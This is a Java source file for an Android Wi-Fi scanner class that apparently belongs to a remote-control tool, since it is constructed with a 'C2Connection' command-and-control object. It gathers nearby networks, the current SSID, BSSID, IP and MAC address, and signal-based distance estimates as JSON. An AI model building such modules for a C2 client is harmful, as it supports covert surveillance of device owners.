package com.tarjon.admin.utils;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.tarjon.admin.network.C2Connection;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Scans and manages Wi-Fi networks
 */
public class WifiScanner {
    private static final String TAG = "WifiScanner";
    
    private final Context context;
    private final C2Connection c2Connection;
    private final ExecutorService executor;
    
    private WifiManager wifiManager;
    private WifiScanReceiver wifiScanReceiver;
    private AtomicBoolean isScanning = new AtomicBoolean(false);
    
    // Timeout for scan (seconds)
    private static final int SCAN_TIMEOUT = 30;
    
    // Encryption types
    private static final int SECURITY_NONE = 0;
    private static final int SECURITY_WEP = 1;
    private static final int SECURITY_PSK = 2;
    private static final int SECURITY_EAP = 3;
    private static final int SECURITY_SAE = 4;
    private static final int SECURITY_OWE = 5;
    
    /**
     * BroadcastReceiver for Wi-Fi scan results
     */
    private class WifiScanReceiver extends BroadcastReceiver {
        private WifiScanCallback callback;
        
        WifiScanReceiver(WifiScanCallback callback) {
            this.callback = callback;
        }
        
        @Override
        public void onReceive(Context context, Intent intent) {
            boolean success = intent.getBooleanExtra(WifiManager.EXTRA_RESULTS_UPDATED, false);
            if (success) {
                scanSuccess();
            } else {
                scanFailure();
            }
        }
        
        /**
         * Process successful scan
         */
        private void scanSuccess() {
            List<ScanResult> results = wifiManager.getScanResults();
            isScanning.set(false);
            
            if (callback != null) {
                try {
                    // Create JSON with scan results
                    JSONObject scanResultsJson = convertScanResultsToJson(results);
                    callback.onScanComplete(scanResultsJson.toString());
                } catch (JSONException e) {
                    Log.e(TAG, "Error creating scan results JSON: " + e.getMessage());
                    callback.onError("Error processing scan results: " + e.getMessage());
                }
            }
        }
        
        /**
         * Handle scan failure
         */
        private void scanFailure() {
            isScanning.set(false);
            
            // Try getting results anyway
            List<ScanResult> results = wifiManager.getScanResults();
            if (results != null && !results.isEmpty()) {
                scanSuccess();
                return;
            }
            
            if (callback != null) {
                callback.onError("Wi-Fi scan failed");
            }
        }
    }
    
    public WifiScanner(Context context, C2Connection c2Connection) {
        this.context = context;
        this.c2Connection = c2Connection;
        this.executor = Executors.newSingleThreadExecutor();
        
        // Initialize Wi-Fi manager
        wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
    }
    
    /**
     * Start scanning for Wi-Fi networks
     * @param callback Callback for scan results
     */
    public void startScan(final WifiScanCallback callback) {
        if (wifiManager == null) {
            if (callback != null) {
                callback.onError("Wi-Fi manager not available");
            }
            return;
        }
        
        // Check permissions for Wi-Fi scanning
        boolean hasLocationPermission = false;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ requires FINE_LOCATION for Wi-Fi scanning
            hasLocationPermission = ActivityCompat.checkSelfPermission(context, 
                    Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        } else {
            // Older versions can use COARSE_LOCATION
            hasLocationPermission = (ActivityCompat.checkSelfPermission(context, 
                    Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) ||
                    (ActivityCompat.checkSelfPermission(context, 
                            Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED);
        }
        
        if (!hasLocationPermission) {
            if (callback != null) {
                callback.onError("Location permission not granted for Wi-Fi scanning");
            }
            return;
        }
        
        // Ensure Wi-Fi is enabled
        if (!wifiManager.isWifiEnabled()) {
            if (callback != null) {
                callback.onError("Wi-Fi is not enabled");
            }
            return;
        }
        
        // Check if already scanning
        if (isScanning.get()) {
            if (callback != null) {
                callback.onError("Wi-Fi scan already in progress");
            }
            return;
        }
        
        // Set up scan receiver
        wifiScanReceiver = new WifiScanReceiver(callback);
        IntentFilter intentFilter = new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
        context.registerReceiver(wifiScanReceiver, intentFilter);
        
        // Start scanning
        isScanning.set(true);
        boolean success = wifiManager.startScan();
        
        if (!success) {
            isScanning.set(false);
            context.unregisterReceiver(wifiScanReceiver);
            
            if (callback != null) {
                callback.onError("Failed to start Wi-Fi scan");
            }
            return;
        }
        
        // Set timeout
        executor.execute(() -> {
            try {
                // Wait for scan to complete or timeout
                TimeUnit.SECONDS.sleep(SCAN_TIMEOUT);
                
                // If still scanning after timeout, cancel
                if (isScanning.getAndSet(false)) {
                    try {
                        context.unregisterReceiver(wifiScanReceiver);
                    } catch (Exception e) {
                        // Ignore if receiver already unregistered
                    }
                    
                    if (callback != null) {
                        callback.onError("Wi-Fi scan timed out");
                    }
                }
            } catch (InterruptedException e) {
                // Ignore
            }
        });
    }
    
    /**
     * Get current Wi-Fi connection info
     * @return JSON string with current Wi-Fi info
     */
    public String getCurrentWifiInfo() {
        if (wifiManager == null) {
            return createErrorJson("Wi-Fi manager not available");
        }
        
        try {
            JSONObject wifiInfo = new JSONObject();
            
            // Check Wi-Fi state
            int wifiState = wifiManager.getWifiState();
            wifiInfo.put("wifiEnabled", wifiState == WifiManager.WIFI_STATE_ENABLED);
            
            // Add Wi-Fi state as string
            switch (wifiState) {
                case WifiManager.WIFI_STATE_DISABLED:
                    wifiInfo.put("wifiState", "disabled");
                    break;
                case WifiManager.WIFI_STATE_DISABLING:
                    wifiInfo.put("wifiState", "disabling");
                    break;
                case WifiManager.WIFI_STATE_ENABLED:
                    wifiInfo.put("wifiState", "enabled");
                    break;
                case WifiManager.WIFI_STATE_ENABLING:
                    wifiInfo.put("wifiState", "enabling");
                    break;
                default:
                    wifiInfo.put("wifiState", "unknown");
                    break;
            }
            
            // Get current connection info
            WifiInfo connectionInfo = wifiManager.getConnectionInfo();
            if (connectionInfo != null) {
                boolean isConnected = connectionInfo.getNetworkId() != -1;
                wifiInfo.put("connected", isConnected);
                
                if (isConnected) {
                    // SSID is surrounded by quotes, remove them
                    String ssid = connectionInfo.getSSID();
                    if (ssid != null && ssid.startsWith("\"") && ssid.endsWith("\"")) {
                        ssid = ssid.substring(1, ssid.length() - 1);
                    }
                    wifiInfo.put("ssid", ssid != null ? ssid : "");
                    wifiInfo.put("bssid", connectionInfo.getBSSID() != null ? connectionInfo.getBSSID() : "");
                    
                    // Signal strength
                    int rssi = connectionInfo.getRssi();
                    wifiInfo.put("rssi", rssi);
                    wifiInfo.put("signalLevel", WifiManager.calculateSignalLevel(rssi, 5));
                    
                    // IP address
                    int ip = connectionInfo.getIpAddress();
                    wifiInfo.put("ipAddress", formatIpAddress(ip));
                    
                    // Link speed
                    wifiInfo.put("linkSpeed", connectionInfo.getLinkSpeed());
                    wifiInfo.put("linkSpeedUnits", WifiInfo.LINK_SPEED_UNITS);
                    
                    // Frequency
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        int frequency = connectionInfo.getFrequency();
                        wifiInfo.put("frequency", frequency);
                        wifiInfo.put("frequencyUnits", "MHz");
                        wifiInfo.put("band", frequency > 4000 ? "5 GHz" : "2.4 GHz");
                    }
                    
                    // MAC address
                    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q || 
                            ActivityCompat.checkSelfPermission(context, 
                                    Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                        String macAddress = connectionInfo.getMacAddress();
                        wifiInfo.put("macAddress", macAddress != null ? macAddress : "");
                    }
                    
                    // Hidden SSID
                    wifiInfo.put("hiddenSsid", connectionInfo.getHiddenSSID());
                }
            } else {
                wifiInfo.put("connected", false);
            }
            
            return wifiInfo.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating Wi-Fi info JSON: " + e.getMessage());
            return createErrorJson("Error getting Wi-Fi info: " + e.getMessage());
        }
    }
    
    /**
     * Convert Wi-Fi scan results to JSON
     */
    private JSONObject convertScanResultsToJson(List<ScanResult> results) throws JSONException {
        JSONObject resultObj = new JSONObject();
        JSONArray networksArray = new JSONArray();
        
        for (ScanResult result : results) {
            JSONObject network = new JSONObject();
            
            network.put("ssid", result.SSID != null ? result.SSID : "");
            network.put("bssid", result.BSSID != null ? result.BSSID : "");
            network.put("capabilities", result.capabilities != null ? result.capabilities : "");
            
            // Security type
            int securityType = getSecurity(result);
            network.put("securityType", securityType);
            network.put("security", getSecurityString(securityType));
            
            // Signal strength
            network.put("level", result.level);
            network.put("signalLevel", WifiManager.calculateSignalLevel(result.level, 5));
            
            // Frequency
            network.put("frequency", result.frequency);
            network.put("band", result.frequency > 4000 ? "5 GHz" : "2.4 GHz");
            
            // Channel
            network.put("channel", getChannelFromFrequency(result.frequency));
            
            // Distance estimate (approximate)
            double distance = calculateDistance(result.level, result.frequency);
            network.put("distanceMeters", distance);
            
            networksArray.put(network);
        }
        
        resultObj.put("networks", networksArray);
        resultObj.put("count", networksArray.length());
        resultObj.put("timestamp", System.currentTimeMillis());
        
        // Add current connection info
        WifiInfo connectionInfo = wifiManager.getConnectionInfo();
        if (connectionInfo != null && connectionInfo.getNetworkId() != -1) {
            JSONObject currentConnection = new JSONObject();
            
            // SSID is surrounded by quotes, remove them
            String ssid = connectionInfo.getSSID();
            if (ssid != null && ssid.startsWith("\"") && ssid.endsWith("\"")) {
                ssid = ssid.substring(1, ssid.length() - 1);
            }
            
            currentConnection.put("ssid", ssid != null ? ssid : "");
            currentConnection.put("bssid", connectionInfo.getBSSID() != null ? connectionInfo.getBSSID() : "");
            currentConnection.put("rssi", connectionInfo.getRssi());
            currentConnection.put("signalLevel", WifiManager.calculateSignalLevel(connectionInfo.getRssi(), 5));
            currentConnection.put("linkSpeed", connectionInfo.getLinkSpeed());
            currentConnection.put("linkSpeedUnits", WifiInfo.LINK_SPEED_UNITS);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                int frequency = connectionInfo.getFrequency();
                currentConnection.put("frequency", frequency);
                currentConnection.put("frequencyUnits", "MHz");
                currentConnection.put("band", frequency > 4000 ? "5 GHz" : "2.4 GHz");
                currentConnection.put("channel", getChannelFromFrequency(frequency));
            }
            
            resultObj.put("currentConnection", currentConnection);
        }
        
        return resultObj;
    }
    
    /**
     * Get security type from scan result capabilities
     */
    private int getSecurity(ScanResult result) {
        if (result.capabilities == null) {
            return SECURITY_NONE;
        }
        
        final String cap = result.capabilities;
        
        if (cap.contains("WEP")) {
            return SECURITY_WEP;
        } else if (cap.contains("SAE")) {
            return SECURITY_SAE;
        } else if (cap.contains("PSK")) {
            return SECURITY_PSK;
        } else if (cap.contains("EAP")) {
            return SECURITY_EAP;
        } else if (cap.contains("OWE")) {
            return SECURITY_OWE;
        }
        
        return SECURITY_NONE;
    }
    
    /**
     * Get security type string from security type constant
     */
    private String getSecurityString(int securityType) {
        switch (securityType) {
            case SECURITY_WEP:
                return "WEP";
            case SECURITY_PSK:
                return "WPA/WPA2-PSK";
            case SECURITY_EAP:
                return "WPA/WPA2-EAP";
            case SECURITY_SAE:
                return "WPA3-SAE";
            case SECURITY_OWE:
                return "OWE";
            case SECURITY_NONE:
            default:
                return "Open";
        }
    }
    
    /**
     * Calculate approximate distance based on signal strength and frequency
     * Using the log-distance path loss model
     * @param level Signal level in dBm
     * @param frequency Frequency in MHz
     * @return Approximate distance in meters
     */
    private double calculateDistance(int level, int frequency) {
        // Simplified model, not extremely accurate
        double exp = (27.55 - (20 * Math.log10(frequency)) + Math.abs(level)) / 20.0;
        return Math.pow(10.0, exp);
    }
    
    /**
     * Get Wi-Fi channel from frequency
     * @param frequency Frequency in MHz
     * @return Channel number
     */
    private int getChannelFromFrequency(int frequency) {
        // 2.4 GHz channels
        if (frequency >= 2412 && frequency <= 2484) {
            return (frequency - 2412) / 5 + 1;
        }
        // 5 GHz channels
        else if (frequency >= 5170 && frequency <= 5825) {
            return (frequency - 5170) / 5 + 34;
        }
        // 6 GHz channels (Wi-Fi 6E)
        else if (frequency >= 5925 && frequency <= 7125) {
            return (frequency - 5925) / 5 + 1;
        }
        
        return -1;
    }
    
    /**
     * Format IP address from integer to string
     */
    private String formatIpAddress(int ipAddress) {
        return String.format("%d.%d.%d.%d",
                (ipAddress & 0xff),
                (ipAddress >> 8 & 0xff),
                (ipAddress >> 16 & 0xff),
                (ipAddress >> 24 & 0xff));
    }
    
    /**
     * Create error JSON message
     */
    private String createErrorJson(String errorMessage) {
        try {
            JSONObject errorObj = new JSONObject();
            errorObj.put("error", errorMessage);
            return errorObj.toString();
        } catch (JSONException e) {
            return "{\"error\":\"Failed to create error message\"}";
        }
    }
    
    /**
     * Stop scanning and clean up resources
     */
    public void stopScan() {
        if (isScanning.getAndSet(false)) {
            try {
                context.unregisterReceiver(wifiScanReceiver);
            } catch (Exception e) {
                // Ignore if receiver not registered
            }
        }
    }
    
    /**
     * Release resources
     */
    public void release() {
        stopScan();
        
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
    }
    
    /**
     * Callback interface for Wi-Fi scan results
     */
    public interface WifiScanCallback {
        void onScanComplete(String scanResultsJson);
        void onError(String error);
    }
}